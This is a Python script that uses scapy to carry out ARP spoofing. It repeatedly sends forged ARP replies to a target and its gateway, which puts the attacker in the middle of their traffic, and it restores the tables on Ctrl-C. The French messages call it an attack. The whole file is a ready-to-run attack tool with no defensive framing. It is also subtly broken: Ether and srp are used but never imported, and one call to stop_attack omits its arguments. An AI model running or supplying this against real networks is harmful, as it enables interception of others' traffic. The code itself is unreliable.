from scapy.all import ARP, send
import sys
import time
import threading
import signal

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Impossible de trouver l'adresse MAC pour {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"Impossible de trouver les adresses MAC pour {destination_ip} ou {source_ip}")
        return

    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def stop_attack(signum, frame):
    print("\n[INFO] Interruption détectée. Rétablissement des tables ARP...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[INFO] Tables ARP rétablies. Arrêt du programme.")
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <Target IP> <Gateway IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    signal.signal(signal.SIGINT, stop_attack)

    print("[INFO] Démarrage de l'attaque ARP Spoofing...")
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        stop_attack()
